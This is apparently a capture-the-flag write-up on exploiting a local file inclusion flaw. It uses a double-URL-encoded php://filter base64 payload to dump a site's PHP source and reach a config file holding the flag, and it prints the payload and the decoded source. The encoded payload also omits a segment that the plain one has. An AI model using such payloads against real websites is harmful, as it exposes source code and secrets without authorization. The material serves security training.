# Description
```
Statement
Find the validation password in the source files of the website.
```
# Exploit
- Here we have an LFI with a double extension, so the first step is to use the PHP filter:``php://filter/read=convert.base64-encode/resource=home``

- However, in this challenge the input is double-encoded, so we need to replace all special characters with double URL encoding. The payload becomes:``php%253A%252F%252Ffilter%252Fconvert%252ebase64-encode%252Fresource%253Dhome``

- We obtain a Base64-encoded text, so we decode it and get the following result:
```
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Home</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home" class="active">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <div id="main">
      <?= $conf['home'] ?>
    </div>
  </body>
</html>
```
- We see a config page, so we use the same payload as before, but we replace home with config and obtain the flag.